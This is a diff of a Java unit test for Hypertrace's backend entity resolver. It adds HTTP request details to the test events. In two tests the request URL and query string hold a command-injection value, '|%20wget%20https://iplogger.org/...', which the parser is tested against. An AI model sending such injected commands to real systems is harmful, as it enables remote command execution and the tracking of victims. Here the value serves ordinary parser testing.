@@ -1,7 +1,6 @@
 package org.hypertrace.traceenricher.enrichment.enrichers.resolver.backend;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
-import static org.junit.jupiter.api.Assertions.assertTrue;
 import static org.mockito.Mockito.mock;
 import static org.mockito.Mockito.when;
 
@@ -9,7 +8,6 @@ import com.google.common.collect.ImmutableMap;
 import java.nio.ByteBuffer;
 import java.util.Arrays;
 import java.util.Map;
-import java.util.Optional;
 import org.hypertrace.core.datamodel.AttributeValue;
 import org.hypertrace.core.datamodel.Attributes;
 import org.hypertrace.core.datamodel.Event;
@@ -17,11 +15,10 @@ import org.hypertrace.core.datamodel.EventRef;
 import org.hypertrace.core.datamodel.EventRefType;
 import org.hypertrace.core.datamodel.MetricValue;
 import org.hypertrace.core.datamodel.Metrics;
+import org.hypertrace.core.datamodel.eventfields.http.Request;
 import org.hypertrace.core.datamodel.shared.StructuredTraceGraph;
-import org.hypertrace.core.span.constants.RawSpanConstants;
 import org.hypertrace.core.span.constants.v1.Grpc;
 import org.hypertrace.core.span.constants.v1.Http;
-import org.hypertrace.core.span.constants.v1.JaegerAttribute;
 import org.hypertrace.core.span.constants.v1.Mongo;
 import org.hypertrace.core.span.constants.v1.Sql;
 import org.hypertrace.entity.constants.v1.BackendAttribute;
@@ -85,7 +82,14 @@ public class BackendEntityResolverTest extends AbstractAttributeEnricherTest {
         .setEventRefList(Arrays.asList(
             EventRef.newBuilder().setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                 .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
-                .setRefType(EventRefType.CHILD_OF).build())).build();
+                .setRefType(EventRefType.CHILD_OF).build()))
+            .setHttp(org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
+                    .setRequest(Request.newBuilder()
+                            .setHost("dataservice:9394")
+                            .setPath("/product/5d644175551847d7408760b1")
+                            .build())
+                    .build())
+            .build();
 
     final Entity backendEntity = backendEntityResolver.resolveEntity(e, structuredTraceGraph).get();
     assertEquals(backendEntity.getEntityName(), "dataservice.mypastryshop.devcluster:9394");
@@ -138,7 +142,15 @@ public class BackendEntityResolverTest extends AbstractAttributeEnricherTest {
         .setEventRefList(Arrays.asList(
             EventRef.newBuilder().setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                 .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
-                .setRefType(EventRefType.CHILD_OF).build())).build();
+                .setRefType(EventRefType.CHILD_OF).build()))
+            .setHttp(org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
+                    .setRequest(Request.newBuilder()
+                            .setUrl("http://dataservice:9394/product/5d644175551847d7408760b4")
+                            .setHost("dataservice:9394")
+                            .setPath("product/5d644175551847d7408760b4")
+                            .build())
+                    .build())
+            .build();
 
     final Entity backendEntity = backendEntityResolver.resolveEntity(e, structuredTraceGraph).get();
     assertEquals("dataservice.mypastryshop.devcluster:9394", backendEntity.getEntityName());
@@ -185,7 +197,16 @@ public class BackendEntityResolverTest extends AbstractAttributeEnricherTest {
         .setEventRefList(Arrays.asList(
             EventRef.newBuilder().setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                 .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
-                .setRefType(EventRefType.CHILD_OF).build())).build();
+                .setRefType(EventRefType.CHILD_OF).build()))
+            .setHttp(org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
+                    .setRequest(Request.newBuilder()
+                            .setUrl("http://dataservice:9394/userreview?productId=5d644175551847d7408760b4")
+                            .setHost("dataservice:9394")
+                            .setPath("/userreview")
+                            .setQueryString("productId=5d644175551847d7408760b4")
+                            .build())
+                    .build())
+            .build();
 
     final Entity backendEntity = backendEntityResolver.resolveEntity(e, structuredTraceGraph).get();
     assertEquals("dataservice.mypastryshop.devcluster:9394", backendEntity.getEntityName());
@@ -237,7 +258,14 @@ public class BackendEntityResolverTest extends AbstractAttributeEnricherTest {
         .setEventRefList(Arrays.asList(
             EventRef.newBuilder().setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                 .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
-                .setRefType(EventRefType.CHILD_OF).build())).build();
+                .setRefType(EventRefType.CHILD_OF).build()))
+            .setHttp(org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
+                    .setRequest(Request.newBuilder()
+                            .setHost("dataservice:9394")
+                            .setPath("/product/5d644175551847d7408760b1")
+                            .build())
+                    .build())
+            .build();
 
     final Entity backendEntity = backendEntityResolver.resolveEntity(e, structuredTraceGraph).get();
     assertEquals(backendEntity.getEntityName(), "dataservice.mypastryshop.devcluster:9394");
@@ -264,7 +292,7 @@ public class BackendEntityResolverTest extends AbstractAttributeEnricherTest {
   }
 
   @Test
-  public void checkBackendEntityGeneratedFromHttpEventUrlWithIllegalCharacter() {
+  public void checkBackendEntityGeneratedFromHttpEventUrlWithIllegalQueryCharacter() {
     Event e = Event.newBuilder().setCustomerId("__default")
         .setEventId(ByteBuffer.wrap("bdf03dfabf5c70f8".getBytes()))
         .setEntityIdList(Arrays.asList("4bfca8f7-4974-36a4-9385-dd76bf5c8824"))
@@ -291,10 +319,32 @@ public class BackendEntityResolverTest extends AbstractAttributeEnricherTest {
         .setEventRefList(Arrays.asList(
             EventRef.newBuilder().setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                 .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
-                .setRefType(EventRefType.CHILD_OF).build())).build();
+                .setRefType(EventRefType.CHILD_OF).build()))
+        .setHttp(org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
+                .setRequest(Request.newBuilder()
+                        .setUrl("http://dataservice:9394/api/timelines?uri=|%20wget%20https://iplogger.org/1pzQq7")
+                        .setHost("dataservice:9394")
+                        .setPath("/api/timelines")
+                        .setQueryString("uri=|%20wget%20https://iplogger.org/1pzQq")
+                        .build())
+                .build())
+        .build();
 
-    Optional<Entity> backendEntity = backendEntityResolver.resolveEntity(e, structuredTraceGraph);
-    assertTrue(backendEntity.isEmpty());
+    Entity backendEntity = backendEntityResolver.resolveEntity(e, structuredTraceGraph).get();
+    assertEquals("dataservice.mypastryshop.devcluster:9394", backendEntity.getEntityName());
+    assertEquals(3, backendEntity.getIdentifyingAttributesCount());
+    assertEquals("HTTP", backendEntity.getIdentifyingAttributesMap()
+            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PROTOCOL)).getValue().getString());
+    assertEquals("dataservice.mypastryshop.devcluster", backendEntity.getIdentifyingAttributesMap()
+            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_HOST)).getValue().getString());
+    assertEquals("9394", backendEntity.getIdentifyingAttributesMap()
+            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PORT)).getValue().getString());
+    assertEquals("egress_http", backendEntity.getAttributesMap()
+            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT)).getValue().getString());
+    assertEquals("62646630336466616266356337306638", backendEntity.getAttributesMap()
+            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT_ID)).getValue().getString());
+    assertEquals("GET", backendEntity.getAttributesMap().
+            get(Constants.getRawSpanConstant(Http.HTTP_METHOD)).getValue().getString());
   }
 
   @Test
@@ -325,7 +375,16 @@ public class BackendEntityResolverTest extends AbstractAttributeEnricherTest {
         .setEventRefList(Arrays.asList(
             EventRef.newBuilder().setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                 .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
-                .setRefType(EventRefType.CHILD_OF).build())).build();
+                .setRefType(EventRefType.CHILD_OF).build()))
+            .setHttp(org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
+                    .setRequest(Request.newBuilder()
+                            .setUrl("http://dataservice:9394/api/timelines?uri=|%20wget%20https://iplogger.org/1pzQq7")
+                            .setHost("dataservice:9394")
+                            .setPath("/api/timelines")
+                            .setQueryString("uri=|%20wget%20https://iplogger.org/1pzQq")
+                            .build())
+                    .build())
+            .build();
 
     final Entity backendEntity = backendEntityResolver.resolveEntity(e, structuredTraceGraph).get();
     assertEquals(backendEntity.getEntityName(), "dataservice.mypastryshop.devcluster:9394");
